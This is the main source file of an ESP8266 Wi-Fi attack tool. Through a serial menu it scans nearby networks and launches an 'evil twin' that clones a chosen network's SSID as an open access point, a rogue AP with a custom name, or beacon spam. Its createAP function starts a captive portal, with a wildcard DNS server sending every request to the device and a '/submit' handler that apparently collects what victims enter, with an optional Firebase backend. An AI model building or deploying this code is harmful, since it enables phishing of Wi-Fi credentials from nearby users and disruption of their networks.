#include <ESP8266WiFi.h>
#include "View.h"
#include "WebPortal.h"
#include "NetworkList.h"
#include "FirebaseCom.h"
#include "BeaconSpam.h"

using namespace View;
using namespace WebPortal;
using namespace FirebaseCom;

IPAddress local_IP(192,168,4,22);
IPAddress subnet(255,255,255,0);

FirebaseData FBdata;
FirebaseAuth auth;
FirebaseConfig config;

ESP8266WebServer server(DEFAULT_PORT);
DNSServer dnsServer;

NetworkList networks;

String SSID;
bool apStarted = false; // to see if there is a point running
bool internetConnection = false;
bool attacking = false; //if any attacks are happening
bool beaconSpamAttack = false;

void setup() {

    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(); // Disconnect from any previously connected network

    delay(1000); // Wait for the module to disconnect

    Serial.begin(115200);
    Serial.flush();


    Serial.println("\n");//need online mode for firebase
    Serial.println("1: Online Mode");
    Serial.println("2: Offline Mode");
    Serial.print("Enter Mode: ");
    
    while (!Serial.available()){}
    internetConnection = Serial.parseInt() == 1;

    if(internetConnection){
        //connecting to internet
        Serial.println("Connecting to Internet...");

        WiFi.begin(HOST_SSID, HOST_PASSWORD);
        while (WiFi.status() != WL_CONNECTED){
            Serial.println(".");
            delay(1000);
        }
        Serial.println("Connected To Internet");

        firebaseSetup();
    }
    delay(10);
}


void loop(){
    if (!attacking){

        printInstruction();
        uint8_t menuInput=0;
        getIntInput(menuInput);

        switch (menuInput){
            case 1:
                findNewNetworks();
                break;
            case 2:
                evilTwin();
                break;
            case 3:
                Serial.print("Enter custom SSID: ");
                getStrInput(SSID);
                createAP();
                attacking = true;
                break;
            case 4:
                if(beaconSpamSetup()){
                    beaconSpamAttack = true;
                    attacking = true;
                }
                break;
            default:
                Serial.println("Enter a Valid Answer: ");
                printInstruction();
                break;
        }
    } else{
        if(beaconSpamAttack) beaconSpam();

        if(apStarted){
            dnsServer.processNextRequest();
            server.handleClient();
        }
    }
            
}

void findNewNetworks(){
    Serial.println("\nScanning for available networks:");

    uint8_t newNumNetworks = WiFi.scanNetworks();
    String SSID;
    String BSSIDstr;
    uint8_t BSSID[6];
    float RSSI;
    uint8_t channel;

    for (uint8_t i = 0; i < newNumNetworks; i++){
        SSID = WiFi.SSID(i);
        BSSIDstr = WiFi.BSSIDstr(i);
        memcpy(BSSID, WiFi.BSSID(i), 6);
        RSSI = WiFi.RSSI(i);
        channel = WiFi.channel(i);

        networks.addNetwork(SSID, BSSIDstr, BSSID, RSSI, channel);
   
    }
    networks.printNetworks();
}

void evilTwin(){
    if(networks.getSize() == 0){
        Serial.println("No networks observed.");
        return;
    }

    
    Serial.print("\nWhich network # to mimic: ");
    uint8_t networkNum;
    getIntInput(networkNum);
    Serial.printf("\nChosing network #%d\n", networkNum);

    if(networkNum >= 0 && networkNum <= networks.getSize()){
        SSID = *networks.getSSID(networkNum-1);
        attacking = createAP();
    }else{
        Serial.println("Invalid network number.");
    }
}

bool createAP(){
    Serial.print("Creating network: ");
    Serial.println(SSID);
    
    if (!WiFi.softAPConfig(local_IP, local_IP, subnet)) {
        Serial.println("Failed to configure AP");
        return false;
    }
    
    //WiFi.softAP(SSID, AP_PASSWORD,1, false, 4)
    if (!WiFi.softAP(SSID)) {
        Serial.println("Failed to start AP");
        return false;
    }

    if(!dnsServer.start(DNS_PORT, "*", local_IP)){
        Serial.println("Failed to start DNS Server");
        return false;
    }

    delay(500);

    Serial.println("\nHTTP server started");
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());

    server.onNotFound([]() {
        handleConnect();
    });

    server.on("/submit", []() {
        handleSubmit();
    });
    //server.onNotFound(handleNotFound);
    server.begin();
    apStarted = true;
    
    return true;
}


